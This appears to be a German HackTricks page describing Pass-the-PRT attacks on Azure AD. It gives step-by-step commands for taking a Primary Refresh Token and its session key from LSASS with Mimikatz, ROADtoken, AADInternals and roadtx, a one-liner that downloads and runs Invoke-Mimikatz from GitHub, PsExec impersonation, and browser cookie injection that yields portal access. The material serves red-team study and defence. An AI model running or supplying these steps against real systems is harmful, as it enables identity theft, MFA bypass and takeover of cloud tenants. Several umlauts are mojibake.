# Az - Passe den PRT weiter

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## Was ist ein PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### √úberpr√ºfen Sie, ob Sie einen PRT haben
```
Dsregcmd.exe /status
```
Im Abschnitt SSO-Status sollte **`AzureAdPrt`** auf **JA** gesetzt sein.

<figure><img src="../../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

Im selben Output k√∂nnen Sie auch sehen, ob das **Ger√§t mit Azure verbunden ist** (im Feld `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

## PRT-Cookie

Das PRT-Cookie wird tats√§chlich **`x-ms-RefreshTokenCredential`** genannt und ist ein JSON Web Token (JWT). Ein JWT enth√§lt **3 Teile**, den **Header**, den **Payload** und die **Signatur**, getrennt durch einen `.` und alle url-sicher base64-codiert. Ein typisches PRT-Cookie enth√§lt den folgenden Header und Body:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
Der tats√§chliche **Primary Refresh Token (PRT)** ist im **`refresh_token`** enthalten, das von einem von Azure AD kontrollierten Schl√ºssel verschl√ºsselt ist, wodurch sein Inhalt f√ºr uns undurchsichtig und nicht entschl√ºsselbar ist. Das Feld **`is_primary`** kennzeichnet die Einbettung des prim√§ren Auffrischungstokens in diesem Token. Um sicherzustellen, dass das Cookie an die spezifische Anmeldesitzung gebunden bleibt, f√ºr die es gedacht war, wird der `request_nonce` von der Seite `logon.microsoftonline.com` √ºbertragen.

### PRT-Cookie-Fluss unter Verwendung von TPM

Der **LSASS**-Prozess sendet den **KDF-Kontext** an den TPM, und der TPM verwendet den **Sitzungsschl√ºssel** (der beim Registrieren des Ger√§ts in AzureAD gesammelt und im TPM gespeichert wurde) und den vorherigen Kontext, um einen **Schl√ºssel abzuleiten**. Dieser **abgeleitete Schl√ºssel** wird verwendet, um das PRT-Cookie (JWT) zu **signieren**.

Der **KDF-Kontext** ist ein einmaliges Element von AzureAD und dem PRT, das ein **JWT** gemischt mit einem **Kontext** (Zufallsbytes) erstellt.

Daher ist es selbst wenn der PTR nicht extrahiert werden kann, da er sich im TPM befindet, m√∂glich, LSASS zu missbrauchen, um **abgeleitete Schl√ºssel aus neuen Kontexten anzufordern und die generierten Schl√ºssel zum Signieren von Cookies zu verwenden**.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Szenarien f√ºr den Missbrauch von PRT

Als **regul√§rer Benutzer** ist es m√∂glich, die **Nutzung von PRT anzufordern**, indem man LSASS um SSO-Daten bittet.\
Dies kann wie bei **nativen Apps** erfolgen, die Token vom **Web Account Manager** (Token-Broker) anfordern. WAM leitet die Anfrage an **LSASS** weiter, das Token unter Verwendung einer signierten PRT-Behauptung anfordert. Oder es kann mit **browserbasierten (Web-)Flows** erfolgen, bei denen ein **PRT-Cookie** als **Header** verwendet wird, um Anfragen an Azure AS-Anmeldeseiten zu authentifizieren.

Als **SYSTEM** k√∂nnten Sie den **PRT stehlen, wenn er nicht durch TPM gesch√ºtzt ist**, oder mit den PRT-Schl√ºsseln in LSASS √ºber Krypto-APIs interagieren.

## Beispiele f√ºr Pass-the-PRT-Angriffe

### Angriff - ROADtoken

F√ºr weitere Informationen zu dieser Methode [**√ºberpr√ºfen Sie diesen Beitrag**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken wird **`BrowserCore.exe`** aus dem richtigen Verzeichnis ausf√ºhren und es verwenden, um ein PRT-Cookie zu erhalten. Dieses Cookie kann dann mit ROADtools verwendet werden, um sich zu authentifizieren und einen **persistente Auffrischungstoken** zu erhalten.

Um ein g√ºltiges PRT-Cookie zu generieren, ben√∂tigen Sie zun√§chst ein einmaliges Element.\
Sie k√∂nnen dies mit:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Oder mit [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Dann k√∂nnen Sie [**roadtoken**](https://github.com/dirkjanm/ROADtoken) verwenden, um ein neues PRT zu erhalten (f√ºhren Sie das Tool aus einem Prozess des Benutzers aus, um anzugreifen):
```powershell
.\ROADtoken.exe <nonce>
```
Als Einzeiler:

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Dann k√∂nnen Sie das **generierte Cookie** verwenden, um **Token zu generieren**, um sich √ºber Azure AD **Graph** oder Microsoft Graph **anzumelden**:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Angriff - Verwendung von roadrecon



### Angriff - Verwendung eines geleakten PTR mit AADInternals

`Get-AADIntUserPRTToken` **erh√§lt den PRT-Token des Benutzers** vom Azure AD- oder Hybrid-verbundenen Computer. Verwendet `BrowserCore.exe`, um den PRT-Token zu erhalten.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Oder wenn Sie die Werte von Mimikatz haben, k√∂nnen Sie auch AADInternals verwenden, um ein Token zu generieren:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Gehe zu [https://login.microsoftonline.com](https://login.microsoftonline.com), l√∂sche alle Cookies f√ºr login.microsoftonline.com und gib ein neues Cookie ein.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Then go to [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Der Rest sollte den Standardeinstellungen entsprechen. Stellen Sie sicher, dass Sie die Seite aktualisieren k√∂nnen und das Cookie nicht verschwindet. Wenn es verschwindet, haben Sie m√∂glicherweise einen Fehler gemacht und m√ºssen den Vorgang erneut durchf√ºhren. Wenn nicht, sollten Sie in Ordnung sein.
{% endhint %}

### Angriff - Mimikatz

#### Schritte

1. Das **PRT (Primary Refresh Token) wird aus LSASS** (Local Security Authority Subsystem Service) extrahiert und f√ºr die sp√§tere Verwendung gespeichert.
2. Als N√§chstes wird der **Sitzungsschl√ºssel extrahiert**. Da dieser Schl√ºssel zun√§chst ausgegeben und dann vom lokalen Ger√§t erneut verschl√ºsselt wird, ist eine Entschl√ºsselung mithilfe eines DPAPI-Meisterschl√ºssels erforderlich. Detaillierte Informationen zum DPAPI (Data Protection API) finden Sie in diesen Ressourcen: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) und f√ºr ein Verst√§ndnis seiner Anwendung verweisen Sie auf den [Pass-the-cookie-Angriff](az-pass-the-cookie.md).
3. Nach der Entschl√ºsselung des Sitzungsschl√ºssels werden der **abgeleitete Schl√ºssel und der Kontext f√ºr das PRT** erhalten. Diese sind entscheidend f√ºr die **Erstellung des PRT-Cookies**. Insbesondere wird der abgeleitete Schl√ºssel verwendet, um das JWT (JSON Web Token) zu signieren, das das Cookie bildet. Eine umfassende Erkl√§rung dieses Prozesses wurde von Dirk-jan bereitgestellt und ist hier zug√§nglich: [hier](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

{% hint style="danger" %}
Beachten Sie, dass, wenn sich das PRT im TPM befindet und nicht in `lsass`, **mimikatz es nicht extrahieren kann**.\
Es wird jedoch m√∂glich sein, einen Schl√ºssel aus einem abgeleiteten Schl√ºssel aus einem Kontext aus dem TPM zu erhalten und ihn zu verwenden, um **ein Cookie zu signieren (√ºberpr√ºfen Sie Option 3).**
{% endhint %}

Eine **ausf√ºhrliche Erkl√§rung des durchgef√ºhrten Prozesses** zur Extraktion dieser Details finden Sie hier: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
Dies wird nach den im August 2021 behobenen Fehlern nicht mehr genau funktionieren, um die PRT-Token anderer Benutzer zu erhalten, da nur der Benutzer sein PRT erhalten kann (ein lokaler Administrator kann nicht auf die PRTs anderer Benutzer zugreifen), aber auf seine zugreifen kann.
{% endhint %}

Sie k√∂nnen **mimikatz** verwenden, um das PRT zu extrahieren:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

**Kopieren** Sie den Teil, der als **Prt** bezeichnet ist, und speichern Sie ihn.\
Extrahieren Sie auch den Sitzungsschl√ºssel (den **`KeyValue`** des Feldes **`ProofOfPossesionKey`**), den Sie unten hervorgehoben sehen k√∂nnen. Dieser ist verschl√ºsselt und wir m√ºssen unsere DPAPI-Hauptschl√ºssel verwenden, um ihn zu entschl√ºsseln.

<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Wenn Sie keine PRT-Daten sehen, k√∂nnte es sein, dass Sie **keine PRTs** haben, weil Ihr Ger√§t nicht mit Azure AD verbunden ist, oder es k√∂nnte sein, dass Sie eine **veraltete Version** von Windows 10 verwenden.
{% endhint %}

Um den Sitzungsschl√ºssel zu **entschl√ºsseln**, m√ºssen Sie Ihre Berechtigungen auf **SYSTEM** erh√∂hen, um im Kontext des Computers unter dem **DPAPI-Hauptschl√ºssel** ausf√ºhren zu k√∂nnen. Verwenden Sie die folgenden Befehle, um dies zu tun:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>

#### Option 1 - Vollst√§ndiges Mimikatz

* Jetzt m√∂chten Sie sowohl den Kontextwert kopieren:

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

* Als auch den abgeleiteten Schl√ºsselwert:

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

* Schlie√ülich k√∂nnen Sie all diese Informationen verwenden, um **PRT-Cookies zu generieren**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

* Gehe zu [https://login.microsoftonline.com](https://login.microsoftonline.com), l√∂sche alle Cookies f√ºr login.microsoftonline.com und gib ein neues Cookie ein.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Gehe dann zu [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Der Rest sollte standardm√§√üig sein. Stelle sicher, dass du die Seite aktualisieren kannst und das Cookie nicht verschwindet. Falls es verschwindet, hast du m√∂glicherweise einen Fehler gemacht und musst den Vorgang erneut durchf√ºhren. Wenn es nicht verschwindet, solltest du in Ordnung sein.
{% endhint %}

#### Option 2 - roadrecon mit PTR

* Erneuere zuerst den PRT, der in `roadtx.prt` gespeichert wird:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* Jetzt k√∂nnen wir **Token anfordern**, indem wir den interaktiven Browser mit `roadtx browserprtauth` verwenden. Wenn wir den Befehl `roadtx describe` verwenden, sehen wir, dass das Zugriffstoken einen MFA-Claim enth√§lt, da der PRT, den ich in diesem Fall verwendet habe, auch einen MFA-Claim hatte.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Option 3 - roadrecon mit abgeleiteten Schl√ºsseln verwenden

Nachdem der Kontext und der von mimikatz abgelegte Schl√ºssel vorliegen, ist es m√∂glich, roadrecon zu verwenden, um ein neues signiertes Cookie zu generieren mit:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## Referenzen

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
